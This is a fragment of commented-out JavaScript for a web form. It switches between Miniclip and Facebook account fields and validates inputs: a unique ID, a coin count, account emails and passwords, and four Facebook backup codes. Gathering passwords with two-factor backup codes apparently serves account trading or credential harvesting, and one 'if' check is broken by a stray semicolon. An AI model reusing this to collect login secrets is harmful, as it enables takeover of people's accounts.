...
// function showFields() {
//     let dropdown = document.getElementById("accountType").value;
//     let miniclipFields = document.getElementById("miniclipFields");
//     let facebookFields = document.getElementById("facebookFields");

//     if (dropdown == "miniclip") {
//         miniclipFields.classList.remove("hidden");
//         facebookFields.classList.add("hidden");
//     } else if (dropdown == "facebook") {
//         facebookFields.classList.remove("hidden");
//         miniclipFields.classList.add("hidden");
//     } else {
//         miniclipFields.classList.add("hidden");
//         facebookFields.classList.add("hidden");
//     }
...
//     const coinsAvailable = document.getElementById('coinsAvailable').value.trim();
//     const accountType = document.getElementById('accountType').value.trim();
//     const miniclipEmail = document.getElementById('miniclipEmail').value.trim();
//     const miniclipPassword = document.getElementById('miniclipPassword').value.trim();
//     const facebookEmail = document.getElementById('facebookEmail').value.trim();
//     const facebookPassword = document.getElementById('facebookPassword').value.trim();
//     const backupCode1 = document.getElementById('backupCode1').value.trim();
//     const backupCode2 = document.getElementById('backupCode2').value.trim();
//     const backupCode3 = document.getElementById('backupCode3').value.trim();
//     const backupCode4 = document.getElementById('backupCode4').value.trim();
//     let dropdown = document.getElementById("accountType").value;

//     if (dropdown == "miniclip") {
//         if(uniqueId == '' || coinsAvailable == '' || accountType == '' || miniclipEmail == '' || miniclipPassword == '');{
//             return false;
//         }
//     } else if (dropdown == "facebook") {
//         if(uniqueId == '' || coinsAvailable == '' || accountType == '' || facebookEmail == '' || facebookPassword == '' || backupCode1 == '' || backupCode2 == '' || backupCode3 == '' || backupCode4 == ''){
//             return false;
//         }
//     } else {
//         return true;
